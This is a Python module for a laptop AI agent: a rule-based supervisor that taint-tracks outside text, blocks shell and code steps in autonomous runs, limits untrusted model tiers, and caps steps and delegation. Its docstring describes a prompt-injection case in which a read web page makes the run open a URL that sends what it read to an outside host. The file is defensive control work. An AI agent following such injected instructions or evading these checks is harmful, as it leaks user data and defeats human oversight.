"""Every step an autonomous run takes passes through here before it runs.

The approval gate judges one action at a time, as each tool describes it, and MEDIUM runs with
no card in the web app. So a run that had read a web page could be told by that page to
`open url https://elsewhere/?q=<what it read>` and nothing asked: each step was fine alone.
The supervisor is the run's memory. It is plain rules, never a model, because a model that
judges injected text can be talked round by it:

- taint: once the run has read anything it did not write (a page, a file, mail, a note, an MCP
  reply), a step that sends somewhere the text can choose, changes the laptop or changes what is
  remembered is asked about first, even when it would otherwise run silently;
- direct only: the shell, running or rewriting code and deleting files are the user's own
  commands, never a step of a run;
- model trust: a step chosen by a tier that is not trusted (the backup model, unless set
  otherwise) may read and compute, never act; the same holds for a command the router's model
  picks for the user's own sentence;
- off the track: the same step a third time, or two refusals, ends the run;
- one tree: an agent a run delegates to (`delegate`, in `agent team`) shares the run's `RunTree`:
  its taint, its refusals and its stop. A run can start another in no other way, and a trip
  breaker caps the tree's steps a minute, its steps in all, its depth and the agents it starts;
- every verdict is written to the audit log with the rule that made it.

It supervises what a run asks for. What an approved program then does is the operating
system's to contain, not this module's.
"""
from __future__ import annotations

import os
import time
from collections import deque
from dataclasses import dataclass
from enum import Enum
from typing import Callable


class Verdict(str, Enum):
    ALLOW = "allow"
    ASK = "ask"
    REFUSE = "refuse"   # this step is not run; the run goes on and is told why
    STOP = "stop"       # the run ends


@dataclass(frozen=True)
class Decision:
    verdict: Verdict
    rule: str = ""
    reason: str = ""


class RunStopped(Exception):
    """The supervisor ended the run. Its text is the run's answer."""


# The agent's commands by what they mean to a run, as the forms `_AGENT_COMMANDS` lists them
# (tests/test_supervisor.py holds the two together: every command is in exactly one group).
# READS: its result is text the user did not write, so it may carry instructions.
READS = (
    "read file", "ask file", "summarize file", "extract text", "extract tables", "analyze spreadsheet",
    "process file", "search files", "recall", "ask knowledge", "notes search", "ask vault", "read note",
    "web search", "news", "research", "summarize youtube", "read screen", "describe image",
    "describe video", "look at webcam", "email digest", "email api search", "solve", "briefing",
)
# GUARDED: runs with no card today, and reaches an address the text can choose, the desktop, or
# what is remembered. Asked about once the run is tainted.
GUARDED = (
    "open url", "inspect page", "save note", "remember", "forget", "knowledge prune", "index file",
    "watch news", "unwatch", "briefing set", "job add", "screenshot", "play music", "window",
)
# CARDED: its own tool already asks at HIGH or CRITICAL, so a second card would add nothing.
CARDED = (
    "download", "file move", "file copy", "file rename", "undo file", "convert file", "organize folder",
    "open app", "message", "workspace", "learn from chat", "email api draft", "email api send", "mcp",
)
# DIRECT: never a step of a run. Starting a run is here too: `agent run` from a step built a fresh
# supervisor with no taint, so a run could launder itself; `delegate` is the one way, and keeps the tree.
DIRECT = ("run command", "code run", "code fix", "file delete", "agent run", "agent team", "schedule agent",
          "autopilot")
# DELEGATE: hands a sub-task to an agent on a lower tier, in the same tree (offered to `agent team` only).
DELEGATE = ("delegate",)
# SAFE: computed here or read from the user's own stores; neither tainting nor guarded.
SAFE = (
    "scan files", "file info", "knowledge list", "knowledge stats", "notes audit", "windows", "watch health",
    "watches", "image", "document", "weather", "translate", "distance", "trip", "around", "map",
    "hotels near", "total", "average", "count", "jobs", "tasks", "reminders due", "reminder add", "timer",
    "alarm", "timers", "alarms", "lists", "list", "calendar", "convert", "memory", "audit",
)
# A command that both reads and is in another group: a page or a server answers with its own text.
ALSO_READS = ("inspect page", "mcp")
_GROUPS = (("direct", DIRECT), ("guarded", GUARDED), ("carded", CARDED), ("reads", READS), ("safe", SAFE),
           ("delegate", DELEGATE))
MAX_REPEATS = 2
MAX_REFUSALS = 2
# The trip breaker, over the whole run tree. Read at each check, so a test can patch them.
MAX_STEPS_PER_MINUTE = 20
MAX_TREE_STEPS = 20
MAX_DEPTH = 2           # the planner is depth 0
MAX_AGENTS = 4          # agents one tree may start, the planner not counted
TIER_RANK = {"fast": 0, "smart": 1, "ultra": 2}


def _matches(lowered: str, form: str) -> bool:
    return lowered == form or lowered.startswith(form + " ")


def group_of(command: str) -> tuple[str, str]:
    """(group, form) for a command, by its longest matching form; ("unknown", "") for none."""
    lowered = " ".join((command or "").lower().split())
    best = ("unknown", "")
    for name, forms in _GROUPS:
        for form in forms:
            if _matches(lowered, form) and len(form) > len(best[1]):
                best = (name, form)
    return best


def allowed_in_a_run(form: str) -> bool:
    """Whether an agent command form may be offered to a run at all."""
    return group_of(form.split("<", 1)[0].split("[", 1)[0])[0] != "direct"


TIERS = ("fast", "smart", "ultra", "fallback")
UNTRUSTED = "LAPTOP_AGENT_UNTRUSTED_MODELS"
# What a model that is not trusted may still have run: reading and computing, nothing else.
_UNTRUSTED_MAY = frozenset({"safe", "reads"})


def untrusted_tiers() -> frozenset[str]:
    """The model tiers whose choices are not trusted to act (`LAPTOP_AGENT_UNTRUSTED_MODELS`, comma
    separated, from fast, smart, ultra, fallback). Unset, it is the cross-provider backup: a run
    took its steps from whichever tier answered first, so a free backup model had the authority
    of the best one. Set but empty trusts every tier. Read on every call, so a test can switch it."""
    raw = os.environ.get(UNTRUSTED)
    if raw is None:
        return frozenset({"fallback"})
    return frozenset(name for name in (part.strip().lower() for part in raw.split(",")) if name in TIERS)


def trusted(tier: str) -> bool:
    """A tier nobody named is not trusted: the rule fails closed."""
    return tier in TIERS and tier not in untrusted_tiers()


def routed(command: str, tier: str) -> Decision:
    """The verdict on one command a model picked for the user's own sentence (the router)."""
    group, _form = group_of(command)
    if trusted(tier) or group in _UNTRUSTED_MAY:
        return Decision(Verdict.ALLOW, group)
    return Decision(Verdict.REFUSE, "trust", f"the {tier or 'unnamed'} model is not trusted to choose that")


class RunTree:
    """What every agent of one run shares: taint, refusals, the breaker's counts and the stop.

    Kept apart from `Supervisor` so a delegated agent cannot start cleaner than the run that
    started it, and one stop anywhere in the tree stops every agent in it."""

    def __init__(self, clock: Callable[[], float] = time.monotonic) -> None:
        self.tainted_by = ""
        self.refusals = 0
        self.last_refusal = ""
        self.stopped: Decision | None = None
        self.agents: list[dict[str, object]] = []
        self.steps = 0
        self._clock = clock
        self._recent: deque[float] = deque()

    def add_agent(self, parent: str, depth: int, tier: str, task: str) -> str:
        agent = f"a{len(self.agents) + 1}"
        self.agents.append({"id": agent, "parent": parent, "depth": depth, "tier": tier, "task": task, "steps": []})
        return agent

    def stop(self, rule: str, reason: str) -> Decision:
        self.stopped = Decision(Verdict.STOP, rule, reason)
        return self.stopped

    def count_step(self) -> Decision | None:
        """Count one step of any agent; the breaker's verdict when it trips."""
        now = self._clock()
        self.steps += 1
        self._recent.append(now)
        while self._recent and self._recent[0] <= now - 60:
            self._recent.popleft()
        if len(self._recent) > MAX_STEPS_PER_MINUTE:
            return self.stop("breaker:rate", f"its agents took more than {MAX_STEPS_PER_MINUTE} steps in a minute")
        if self.steps > MAX_TREE_STEPS:
            return self.stop("breaker:steps", f"its agents took more than {MAX_TREE_STEPS} steps in all")
        return None


class Supervisor:
    """One agent's supervisor. `check` before each step; `refused` when a step was not approved.

    `tree` is shared by every agent of the same run (a fresh one when not given); `tier` is the tier
    the agent was assigned, which `delegate` may only go below."""

    def __init__(self, tree: RunTree | None = None, *, agent: str = "a0", parent: str = "", depth: int = 0,
                 tier: str = "") -> None:
        self.tree = tree or RunTree()
        self.agent = agent
        self.parent = parent
        self.depth = depth
        self.tier = tier
        self._seen: dict[str, int] = {}

    @property
    def tainted_by(self) -> str:
        return self.tree.tainted_by

    def refused(self, why: str = "you did not approve it") -> None:
        self.tree.refusals += 1
        self.tree.last_refusal = why

    def check(self, command: str, tier: str = "smart") -> Decision:
        tree = self.tree
        if tree.stopped is not None:
            return tree.stopped
        lowered = " ".join((command or "").lower().split())
        tripped = tree.count_step()
        if tripped is not None:
            return tripped
        if tree.refusals >= MAX_REFUSALS:
            # With the cause: live, "2 of its steps were refused" left the user guessing which rule.
            return tree.stop("refusals", f"{tree.refusals} of its steps were refused, the last because "
                                         f"{tree.last_refusal}")
        self._seen[lowered] = self._seen.get(lowered, 0) + 1
        if self._seen[lowered] > MAX_REPEATS:
            return tree.stop("repeat", f"it tried the same step a third time: {command[:120]}")
        group, form = group_of(lowered)
        if group == "direct":
            self.refused(f"\"{form}\" is never a step of an agent run (ask for it yourself, outside agent mode)")
            return Decision(Verdict.REFUSE, "direct", tree.last_refusal)
        if not trusted(tier) and group not in _UNTRUSTED_MAY:
            self.refused(f"the {tier or 'unnamed'} model chose it, and that model may read and compute but not act")
            return Decision(Verdict.REFUSE, "trust", tree.last_refusal)
        if group == "delegate":
            return self._delegate(lowered)
        tainted_before = tree.tainted_by
        if group == "reads" or any(_matches(lowered, form) for form in ALSO_READS):
            tree.tainted_by = tree.tainted_by or form or lowered[:40]
        if tainted_before and group in {"guarded", "unknown"}:
            return Decision(Verdict.ASK, "taint", f"This run has read outside text ({tainted_before}), which can "
                                                  "carry instructions, and now wants to act on the laptop or send "
                                                  "something out.")
        return Decision(Verdict.ALLOW, group)

    def _delegate(self, lowered: str) -> Decision:
        """`delegate <tier> <sub-task>`: only to a tier below this agent's own, within the breaker."""
        words = lowered.split(maxsplit=2)
        target = words[1] if len(words) > 1 else ""
        own = TIER_RANK.get(self.tier)
        if own is None or target not in TIER_RANK or TIER_RANK[target] >= own:
            self.refused(f"an agent on the {self.tier or 'unnamed'} tier may hand work only to a lower tier, "
                         f"not \"{target or 'none'}\"")
            return Decision(Verdict.REFUSE, "delegate-tier", self.tree.last_refusal)
        if self.depth + 1 > MAX_DEPTH:
            return self.tree.stop("breaker:depth", f"an agent tried to delegate deeper than {MAX_DEPTH} levels")
        if len(self.tree.agents) >= MAX_AGENTS:
            return self.tree.stop("breaker:agents", f"it tried to start more than {MAX_AGENTS} agents")
        return Decision(Verdict.ALLOW, "delegate")
